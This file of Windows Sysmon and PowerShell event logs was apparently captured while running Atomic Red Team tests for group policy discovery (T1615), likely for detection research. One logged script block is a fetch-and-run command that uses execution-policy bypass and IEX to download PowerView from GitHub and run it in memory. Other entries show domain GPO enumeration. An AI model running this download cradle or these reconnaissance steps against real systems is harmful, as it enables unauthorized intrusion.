@@ -1,0 +1,187 @@
+Atomic Test #1 - Display group policy information via gpresult
+
+Log1
+09/04/2024 10:57:23 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=461901
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-04 02:57:23.949
+ProcessGuid: {6f6dba56-cc93-66d7-7423-2d0000001700}
+ProcessId: 110552
+Image: C:\Windows\System32\gpresult.exe
+FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
+Description: Query Group Policy RSOP Data
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: gprslt.exe
+CommandLine: gpresult  /z
+CurrentDirectory: C:\Windows\system32\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
+LogonId: 0x2210C510A
+TerminalSessionId: 2
+IntegrityLevel: High
+Hashes: SHA1=33AAF224AF455B2143BC4548B0609667711D456D,MD5=5B309BB8DE2AE2CF10DA0F30A4F790DC,SHA256=53D27F35B5CBF7EFE1D96EF8D52475E1E6338BD16EA40B386F256DF4E4E30A24,IMPHASH=B8F5E5111C44133C2FA382992BBB3B11
+ParentProcessGuid: {6f6dba56-c9eb-66d7-e61e-2d0000001700}
+ParentProcessId: 109704
+ParentImage: C:\Windows\System32\cmd.exe
+ParentCommandLine: cmd
+ParentUser: DESKTOP-43B3OH1\xcy
+Collapse
+host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1615\T1615.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Log2
+09/04/2024 10:57:59 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=465914
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-04 02:57:59.468
+ProcessGuid: {6f6dba56-ccb7-66d7-b323-2d0000001700}
+ProcessId: 110200
+Image: C:\Windows\System32\gpresult.exe
+FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
+Description: Query Group Policy RSOP Data
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: gprslt.exe
+CommandLine: "C:\Windows\System32\gpresult.exe" 
+CurrentDirectory: C:\Windows\System32\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-3251-0c2102000000}
+LogonId: 0x2210C5132
+TerminalSessionId: 2
+IntegrityLevel: Medium
+Hashes: SHA1=33AAF224AF455B2143BC4548B0609667711D456D,MD5=5B309BB8DE2AE2CF10DA0F30A4F790DC,SHA256=53D27F35B5CBF7EFE1D96EF8D52475E1E6338BD16EA40B386F256DF4E4E30A24,IMPHASH=B8F5E5111C44133C2FA382992BBB3B11
+ParentProcessGuid: {6f6dba56-34a9-66d6-ac60-2a0000001700}
+ParentProcessId: 104996
+ParentImage: C:\Windows\explorer.exe
+ParentCommandLine: C:\Windows\Explorer.EXE
+ParentUser: DESKTOP-43B3OH1\xcy
+Collapse
+host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1615\T1615.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Atomic Test #2 - Get-DomainGPO to display group policy information via PowerView
+
+Log1
+10/02/2024 11:32:57 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=警告
+RecordNumber=3127
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"
+
+ScriptBlock ID: bd12b98d-492a-46b3-9d06-cfa686acc909
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1615\T1615_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #3 - WinPwn - GPOAudit
+
+Log1
+10/02/2024 11:33:22 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3164
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+GPOAudit -noninteractive -consoleoutput
+
+ScriptBlock ID: 780b8136-d76c-4993-8025-01c5e84a295c
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1615\T1615_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+
+Atomic Test #4 - WinPwn - GPORemoteAccessPolicy
+
+Log1
+10/02/2024 11:33:44 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3206
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+GPORemoteAccessPolicy -consoleoutput -noninteractive
+
+ScriptBlock ID: 9178082a-75dd-4944-bb43-0933a47977fa
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1615\T1615_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+
+Atomic Test #5 - MSFT Get-GPO Cmdlet
+
+Log1
+10/02/2024 11:37:22 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3217
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\GPO_Output.txt
+
+ScriptBlock ID: be31ea1d-b5c8-4189-aeb6-4386be3d70a6
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1615\T1615_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
